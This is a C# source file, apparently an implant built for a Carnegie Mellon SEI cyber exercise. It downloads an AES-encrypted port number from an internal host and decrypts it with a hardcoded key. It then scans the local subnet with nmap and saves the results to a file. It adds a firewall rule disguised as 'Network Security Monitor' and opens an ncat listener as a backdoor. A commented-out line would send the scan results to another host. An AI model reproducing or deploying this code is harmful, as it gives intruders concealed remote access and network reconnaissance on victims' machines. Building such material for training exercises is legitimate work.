/*
Copyright 2023 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;

namespace udrvrs
{
    public class Class1
    {
        public async Task Run()
        {
            try
            {
                WebClient webClient = new WebClient();
                string port = webClient.DownloadString("http://10.5.5.219/reg/randomport.txt");
                string iv = "Gh56tref89aQwv4u";
                string key = "jHrtUd0weG43qas9";
                port = DecryptAESString(port, key, iv);

                // run nmap
                // place results in file
                // exfiltrate file contents
                try
                {
                    Process.Start(@"C:\Program Files (x86)\Nmap\nmap.exe", "-oN " + AppDomain.CurrentDomain.BaseDirectory + "scan.txt 10.5.5.0-255");
                    //Thread.Sleep(60000);
                }
                catch (Exception exc) 
                {
                    Console.WriteLine(exc.Message + Environment.NewLine + exc.StackTrace);
                }
                
                //Process.Start("ncat.exe", "-w 3 10.5.5.132 2601 < " + AppDomain.CurrentDomain.BaseDirectory + "scan.txt");
                try
                { 
                    Process.Start("cmd.exe", "/c netsh advfirewall firewall add rule name = \"Network Security Monitor\" dir=in action=allow protocol=TCP localport=" + port);
                }
                catch (Exception exc)
                {
                    Console.WriteLine(exc.Message + Environment.NewLine + exc.StackTrace);
                }

                try
                { 
                    Process.Start(@"C:\Program Files (x86)\Nmap\ncat.exe", "-l -p " + port);
                }
                catch (Exception exc)
                {
                    Console.WriteLine(exc.Message + Environment.NewLine + exc.StackTrace);
                }

                try
                { 
                    Process.Start("cmd.exe", "/c ping 10.5.5.250");
                }
                catch (Exception exc)
                {
                    Console.WriteLine(exc.Message + Environment.NewLine + exc.StackTrace);
                }
            }
            catch (Exception exc)
            {
                Console.WriteLine(exc.StackTrace + Environment.NewLine + exc.Message);
            }
        }

        private string DecryptAESString(string encryptedText, string key, string iv)
        {
            string decryptedText = null;

            using (Aes aes = Aes.Create())
            {
                aes.Key = System.Text.Encoding.Default.GetBytes(key);
                aes.IV = System.Text.Encoding.Default.GetBytes(iv);

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(System.Convert.FromBase64String(encryptedText)))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            decryptedText = streamReader.ReadToEnd();
                        }
                    }
                }
            }

            return decryptedText;
        }
    }
}
